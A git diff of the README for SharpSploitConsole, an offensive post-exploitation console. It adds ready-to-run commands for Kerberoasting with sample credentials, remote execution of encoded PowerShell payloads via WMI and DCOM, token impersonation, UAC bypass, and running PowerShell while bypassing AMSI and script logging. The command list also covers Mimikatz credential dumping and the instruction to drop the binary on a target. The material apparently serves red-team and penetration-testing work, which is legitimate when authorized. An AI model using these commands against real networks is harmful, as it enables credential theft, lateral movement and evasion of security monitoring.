@@ -12,10 +12,10 @@ This concept can be applied to many C# binaries.  For example, we could embed th
 
 Lastly, I am aware there are probably thousands of ways to make this better, faster, cooler, stealthier etc. So please free to let me know....in a nice way. :)  I also plan to add more modules and improve others.
 
-Contact me at:
-- Twitter: @anthemtotheego
+Contact at:
+- Twitter: @anthemtotheego or @g0ldengunsec
 
-**Before submitting issues, this is just a POC and will likely not be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**
+**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**
 
 ![Alt text](/sharpsploitimg1.PNG?raw=true "SharpSploitConsole")
 ![Alt text](/sharpsploitimg2.PNG?raw=true "")
@@ -23,7 +23,7 @@ Contact me at:
 Setup - Quick and Dirty
 ==============================
 
-**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 binary found in the precompiled binaries folder and will get around to adding an x86.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2017 - mileage may vary**
+**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 and x86 binary found in the CompiledBinaries folder.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2017 - mileage may vary**
 
 1. Download SharpSploit tool from https://github.com/cobbr/SharpSploit.git
 
@@ -54,8 +54,14 @@ Setup - Quick and Dirty
 
 7. Compile, drop binary on target computer and have fun.
 
-Examples
+Examples 
 ========
+
+Note:  All commands are case insensitive
+
+Start interactive console mode, otherwise program runs commands given and exits (great for remote shells):
+
+```Interact```
 
 Mimikatz all the things (does not run DCSync) - requires admin or system:
 
@@ -94,6 +100,10 @@ Retrieve current user:
 Impersonate system user - requires admin rights:
 
 ```GetSystem```
+
+Impersonate system user - Impersonate the token of a specified process, requires pid - command requires admin rights:
+
+```Impersonate 2918```
 
 Bypass UAC - requires binary | command | path to binary - requires admin rights:
 
@@ -169,15 +179,45 @@ Port scan systems, requires computername | ports:
 
 ```PortScan computer1 80 443 445 22 23```
 
+Get Domain Users, Grabs specified (or all) user objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target:
+
+```GetDomainUsers```
+
+Get Domain Groups, Grabs specified (or all) group objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target:
+
+```GetDomainGroups```
+
+Get Domain Computers, Grabs specified (or all) computer objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target:
+
+```GetDomainComputers```
+
+Perform Kerberoasting, Performs a kerberoasting attack against targeted (or all) user objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target
+
+```Kerberoast```
+
+```Kerberoast -username bob -password Password1 -domain test.corp -server 192.168.1.10 -target sqlService```
+
 Run command remotely via WMI, requires computername | username | password | command - requires admin:
 
 ```WMI computer1 domain\username P@55w0rd! <entire powershell empire payload>```
 
 ```WMI computer1 .\username P@55w0rd! powershell -noP -sta -w 1 -enc <Base64>```
 
+Run command remotely via DCOM, requires computername | command | directory | params - requires admin:
+
+```DCOM computer1 cmd.exe c:\Windows\System32 powershell -noP -sta -w 1 -enc <Base64>```
+
+Run shell command:
+
+```Shell ipconfig /all```
+
+Run powershell command while attempting to bypass AMSI, scriptBlock logging, and Module logging:
+
+```Powershell powershell -noP -sta -w 1 -enc <Base64>```
 
 # Currently available options (more to come)                           
-                                   
+    
+- **Interact**              : Starts interactive console mode, if you are interacting remotely you may not want to use this option   
 - **Mimi-All**              : Executes everything but DCSync, requires admin
 - **Mimi-Command**          : Executes a chosen Mimikatz command
 - **logonPasswords**        : Runs privilege::debug sekurlsa::logonPasswords
@@ -187,6 +227,7 @@ Run command remotely via WMI, requires computername | username | password | comm
 - **Wdigest**               : Retrieve Wdigest credentials from registry
 - **whoami**                : Retrieve current user 
 - **GetSystem**             : Impersonate system user, requires admin rights
+- **Impersonate**           : Impersonate the token of a specified process, requires pid - command requires admin rights.
 - **BypassUAC**             : Bypass UAC, requires binary | command | path to binary - requires admin rights
 - **RevertToSelf**          : Ends the impersonation of any token, reverts back to initial token associated with current process
 - **CurrentDirectory**      : Retrieve current working directory
@@ -204,4 +245,12 @@ Run command remotely via WMI, requires computername | username | password | comm
 - **NetSessions**           : Retrieve user sessions remotely, requires computername | username | password
 - **Ping**                  : Ping systems, requires computernames"
 - **PortScan**              : Port scan systems, requires computername | ports
+- **GetDomainUsers**        : Grabs specified (or all) user objects in the target domain, by default will use current user context
+- **GetDomainGroups**       : Grabs specified (or all) group objects in the target domain, by default will use current user context
+- **GetDomainComputers**    : Grabs specified (or all) computer objects in the target domain, by default will use current user context
+- **Kerberoast**        : Performs a kerberoasting attack against targeted (or all) user objects in the target domain, by default will use current user context
 - **WMI**                   : Run command remotely via WMI, requires computername | username | password | command | requires admin
+- **DCOM**                  : Run command remotely via DCOM, requires computername | command | directory | params - requires admin
+- **Shell**                 : Run a shell command
+- **Powershell**            : Runs a powershell command while attempting to bypass AMSI, scriptBlock logging, and Module logging
+
